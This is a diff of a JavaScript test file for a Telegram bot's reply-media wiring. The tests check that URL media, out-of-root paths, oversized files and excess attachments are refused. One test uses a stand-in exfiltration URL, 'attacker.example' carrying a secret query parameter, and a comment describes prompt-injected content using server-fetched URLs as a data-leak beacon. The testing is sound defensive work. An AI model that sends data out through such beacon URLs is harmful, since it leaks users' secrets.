@@ -23,6 +23,7 @@ const path = require('node:path');
 const {
   richMediaResolverOptions,
   makeRichMediaResolver,
+  makeReplyMediaWiring,
   createMediaPreflight,
   createMediaFileIdCache,
   PHOTO_UPLOAD_CEILING,
@@ -52,26 +53,16 @@ after(() => {
 // ─── Resolver wiring ───────────────────────────────────────────────────────
 
 describe('richMediaResolverOptions', () => {
-  test('the reply-tool call site pins every gate that decides what may upload', () => {
-    // Asserted by NAME, on the object the resolver is actually built from.
-    // Each of these is a security or resource decision that would still
-    // "work" if it silently reverted to the module default.
-    const opts = richMediaResolverOptions({
-      allowedRoots: ['/work'],
-      chatId: '123',
-      threadId: null,
-      config: null,
-      allowUrlMedia: false,
-      maxMediaPerMessage: MAX_FILES_PER_REPLY,
-    });
+  test('the options carry what the caller did NOT have to state', () => {
+    // Only assertions on values the caller did not pass in can fail here; the
+    // reply tool's own choices are pinned behaviorally in makeReplyMediaWiring
+    // below, because a value echoed straight back proves nothing.
+    const opts = richMediaResolverOptions({ allowedRoots: ['/work'], chatId: '123' });
 
-    assert.equal(opts.allowUrlMedia, false,
-      'URL media is closed on this path unconditionally — files: cannot upload URLs either');
-    assert.equal(opts.maxMediaPerMessage, 10,
-      'the reply-tool fan-out ceiling is the one files: enforces');
-    assert.equal(opts.maxMediaPerMessage, MAX_FILES_PER_REPLY);
     assert.equal(opts.maxTotalMediaBytes, MAX_TOTAL_MEDIA_BYTES,
       'the per-reply byte budget is stated, not inherited by accident');
+    assert.equal(MAX_FILES_PER_REPLY, 10,
+      'the reply-tool ceiling both params share — if this moves, so does the parity claim');
     assert.deepEqual(opts.allowedRoots, ['/work']);
   });
 
@@ -295,5 +286,149 @@ describe('createMediaPreflight', () => {
     ]), 1);
     const [cold] = resolve([{ src: files['chart.png'], caption: '' }]);
     assert.equal(cold.media.fileId, undefined, 'the next reply re-uploads the bytes');
+  });
+});
+
+// ─── The reply tool's envelope, tested by behavior ─────────────────────────
+//
+// These values ARE the reply tool's security and resource boundary. Expressed
+// as an object literal at the wiring site they would be pinned by nothing —
+// polygram.js is never executed by a test, only read as text — so deleting the
+// fan-out ceiling there would widen it 5× with a green suite. Here each one
+// can actually fail.
+
+describe('makeReplyMediaWiring', () => {
+  test('it hands back both halves, built from the call\'s roots', () => {
+    const { dir, files } = workspace();
+    const wiring = makeReplyMediaWiring({})({ allowedRoots: [dir], chatId: '1' });
+
+    assert.equal(typeof wiring.resolveMedia, 'function');
+    assert.equal(typeof wiring.mediaContext.preflightMedia, 'function',
+      'a resolver without a preflight would upload unchecked');
+
+    const [resolved] = wiring.resolveMedia([{ src: files['chart.png'], caption: '' }]);
+    assert.equal(wiring.mediaContext.preflightMedia(resolved.media, 'photo').ok, true,
+      'the two halves agree — same roots, same stat');
+  });
+
+  test('URL media is refused, whatever the server', () => {
+    // files: cannot upload a URL at all, and a URL Telegram fetches
+    // server-side is an exfiltration beacon for prompt-injected content.
+    const { dir } = workspace();
+    const { resolveMedia } = makeReplyMediaWiring({})({ allowedRoots: [dir], chatId: '1' });
+
+    const [r] = resolveMedia([{ src: 'https://attacker.example/b.png?d=secret', caption: '' }]);
+
+    assert.equal(r.rejected, 'url-local-api');
+    assert.equal(r.media, undefined);
+  });
+
+  test('the fan-out ceiling is the one files: enforces', () => {
+    const { dir, files } = workspace({ 'a.png': 8 });
+    const { resolveMedia } = makeReplyMediaWiring({})({ allowedRoots: [dir], chatId: '1' });
+
+    const results = resolveMedia(
+      Array.from({ length: MAX_FILES_PER_REPLY + 2 }, () => ({ src: files['a.png'], caption: '' })),
+    );
+
+    assert.equal(results.filter((r) => r.media).length, MAX_FILES_PER_REPLY);
+    assert.deepEqual(results.slice(MAX_FILES_PER_REPLY).map((r) => r.rejected),
+      ['media-cap', 'media-cap']);
+  });
+
+  test('a path outside the call\'s roots is refused', () => {
+    const inside = workspace();
+    const outside = workspace({ 'secret.png': 8 });
+    const { resolveMedia } = makeReplyMediaWiring({})({
+      allowedRoots: [inside.dir], chatId: '1',
+    });
+
+    const [r] = resolveMedia([{ src: outside.files['secret.png'], caption: '' }]);
+
+    assert.equal(r.rejected, 'path');
+  });
+
+  test('per-file caps follow the chat\'s override', () => {
+    const { dir, files } = workspace({ 'big.png': 4096 });
+    const config = { chats: { 1: { maxFileBytes: 1024 } } };
+    const { resolveMedia } = makeReplyMediaWiring({ config })({
+      allowedRoots: [dir], chatId: '1',
+    });
+
+    const [r] = resolveMedia([{ src: files['big.png'], caption: '' }]);
+
+    assert.equal(r.rejected, 'too-large',
+      'nothing downstream re-checks these bytes — api.js does not walk rich_message');
+  });
+
+  test('rejection telemetry names the verb, the chat, and reason classes only', () => {
+    const inside = workspace();
+    const outside = workspace({ 'secret.png': 8 });
+    const seen = [];
+    const { resolveMedia } = makeReplyMediaWiring({
+      logEvent: (kind, detail) => seen.push({ kind, detail }),
+      botName: 'testbot',
+    })({ allowedRoots: [inside.dir], chatId: '12345', threadId: '77' });
+
+    resolveMedia([{ src: outside.files['secret.png'], caption: '' }]);
+
+    assert.equal(seen[0].kind, 'rich-media-rejected');
+    assert.equal(seen[0].detail.transport, 'send', 'the soak groups by delivering verb');
+    assert.equal(seen[0].detail.chat_id, '12345');
+    assert.equal(seen[0].detail.thread_id, '77');
+    assert.equal(seen[0].detail.bot, 'testbot');
+    assert.deepEqual(seen[0].detail.reasons, ['path']);
+    assert.ok(!JSON.stringify(seen[0]).includes(outside.dir),
+      'a rejected path must not be echoed into telemetry');
+  });
+
+  test('the shared file_id cache is threaded through both halves', () => {
+    const { dir, files } = workspace();
+    const cache = createMediaFileIdCache();
+    const wiring = makeReplyMediaWiring({ fileIdCache: cache })({
+      allowedRoots: [dir], chatId: '1',
+    });
+    const [resolved] = wiring.resolveMedia([{ src: files['chart.png'], caption: '' }]);
+
+    assert.equal(wiring.mediaContext.learnRichResult(
+      [{ type: 'photo', photo: { type: 'photo', media: resolved.media } }],
+      { rich_message: { blocks: [{ type: 'photo', photo: [{ file_id: 'learned', width: 9, height: 9 }] }] } },
+    ), true);
+
+    const [warm] = wiring.resolveMedia([{ src: files['chart.png'], caption: '' }]);
+    assert.equal(warm.media.fileId, 'learned',
+      'the send path fills the cache the streamer path also reads');
+  });
+});
+
+describe('the media-count ceiling', () => {
+  test('a caller asking for zero media gets zero, not the default', () => {
+    // A ceiling option must never widen on the way through. Treating an
+    // explicit 0 as "unset" would turn "no media here" into "up to 50".
+    const { dir, files } = workspace({ 'a.png': 8 });
+    const resolve = makeRichMediaResolver({
+      allowedRoots: [dir], chatId: '1', maxMediaPerMessage: 0,
+    });
+
+    const results = resolve([1, 2, 3].map(() => ({ src: files['a.png'], caption: '' })));
+
+    assert.deepEqual(results.map((r) => r.rejected), ['media-cap', 'media-cap', 'media-cap']);
+  });
+
+  test('a value above the module ceiling is clamped down to it', () => {
+    const opts = richMediaResolverOptions({
+      allowedRoots: [], chatId: '1', maxMediaPerMessage: 500,
+    });
+    const { dir, files } = workspace({ 'a.png': 8 });
+    const resolve = makeRichMediaResolver({
+      allowedRoots: [dir], chatId: '1', maxMediaPerMessage: 500,
+    });
+
+    assert.equal(opts.maxMediaPerMessage, 500, 'the option is passed through as given');
+    const results = resolve(
+      Array.from({ length: MAX_MEDIA_PER_MESSAGE + 1 }, () => ({ src: files['a.png'], caption: '' })),
+    );
+    assert.equal(results.filter((r) => r.media).length, MAX_MEDIA_PER_MESSAGE,
+      'and clamped at enforcement — Telegram rejects the whole reply past 50');
   });
 });
